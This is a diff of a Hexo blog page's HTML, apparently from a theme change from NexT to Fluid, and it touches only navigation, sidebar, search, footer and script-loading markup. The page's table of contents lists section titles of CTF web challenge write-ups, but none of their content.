+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/10/17/20201017-N1CTF/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">2020年10月N1CTF部分web题解</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/09/30/20200930-DownUnderCTF/">
+                        <span class="hidden-mobile">2020年9月DownUnderCTF</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
 
-    
-    
-    
-
-      <footer class="post-footer">
-
-        
-
-
-        
-    <div class="post-nav">
-      <div class="post-nav-item">
-    <a href="/2020/09/30/20200930-DownUnderCTF/" rel="prev" title="2020年9月DownUnderCTF">
-      <i class="fa fa-chevron-left"></i> 2020年9月DownUnderCTF
-    </a></div>
-      <div class="post-nav-item">
-    <a href="/2020/10/17/20201017-N1CTF/" rel="next" title="2020年10月N1CTF部分web题解">
-      2020年10月N1CTF部分web题解 <i class="fa fa-chevron-right"></i>
-    </a></div>
-    </div>
-      </footer>
-    
-  </article>
-  
-  
-  
-
-
-
-          </div>
-          
-
-<script>
-  window.addEventListener('tabs:register', () => {
-    let { activeClass } = CONFIG.comments;
-    if (CONFIG.comments.storage) {
-      activeClass = localStorage.getItem('comments_active') || activeClass;
-    }
-    if (activeClass) {
-      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
-      if (activeTab) {
-        activeTab.click();
-      }
-    }
-  });
-  if (CONFIG.comments.storage) {
-    window.addEventListener('tabs:click', event => {
-      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
-      let commentClass = event.target.classList[1];
-      localStorage.setItem('comments_active', commentClass);
-    });
-  }
-</script>
-
+            
+          </article>
         </div>
-          
-  
-  <div class="toggle sidebar-toggle">
-    <span class="toggle-line toggle-line-first"></span>
-    <span class="toggle-line toggle-line-middle"></span>
-    <span class="toggle-line toggle-line-last"></span>
-  </div>
-
-  <aside class="sidebar">
-    <div class="sidebar-inner">
-
-      <ul class="sidebar-nav motion-element">
-        <li class="sidebar-nav-toc">
-          Table of Contents
-        </li>
-        <li class="sidebar-nav-overview">
-          Overview
-        </li>
-      </ul>
-
-      <!--noindex-->
-      <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#NewUpload%EF%BC%88php-fpm%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%89"><span class="nav-number">1.</span> <span class="nav-text">NewUpload（php-fpm任意代码执行）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#EasyJson%EF%BC%88php-%E5%AE%A1%E8%AE%A1%EF%BC%89"><span class="nav-number">2.</span> <span class="nav-text">EasyJson（php 审计）</span></a></li></ol></div>
       </div>
-      <!--/noindex-->
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-  <p class="site-author-name" itemprop="name">slug01sh</p>
-  <div class="site-description" itemprop="description">欢迎大家发表自己的见解与评价</div>
-</div>
-<div class="site-state-wrap motion-element">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-          <a href="/archives">
-          <span class="site-state-item-count">7</span>
-          <span class="site-state-item-name">posts</span>
-        </a>
-      </div>
-      <div class="site-state-item site-state-categories">
-            <a href="/categories/">
-        <span class="site-state-item-count">3</span>
-        <span class="site-state-item-name">categories</span></a>
-      </div>
-      <div class="site-state-item site-state-tags">
-            <a href="/tags/">
-        <span class="site-state-item-count">6</span>
-        <span class="site-state-item-name">tags</span></a>
-      </div>
-  </nav>
-</div>
-
-
-
-      </div>
-
     </div>
-  </aside>
-  <div id="sidebar-dimmer"></div>
-
-
-      </div>
-    </main>
-
-    <footer class="footer">
-      <div class="footer-inner">
-        
-
-        
-
-<div class="copyright">
-  
-  &copy; 
-  <span itemprop="copyrightYear">2020</span>
-  <span class="with-love">
-    <i class="fa fa-heart"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">slug01sh</span>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
 </div>
-  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
-  </div>
-
-        
-
-
-
-
-
-
-
 
       </div>
-    </footer>
+    
   </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
 
   
-  <script src="/lib/anime.min.js"></script>
-  <script src="/lib/velocity/velocity.min.js"></script>
-  <script src="/lib/velocity/velocity.ui.min.js"></script>
 
-<script src="/js/utils.js"></script>
+  
+</footer>
 
-<script src="/js/motion.js"></script>
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
 
 
-<script src="/js/schemes/pisces.js"></script>
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
 
 
-<script src="/js/next-boot.js"></script>
-
+  
+    <script  src="/js/lazyload.js" ></script>
+  
 
 
 
@@ -463,6 +435,49 @@
 
 
 
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
 
 
 
@@ -475,9 +490,13 @@
 
 
 
-  
 
-  
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
 
 </body>
 </html>
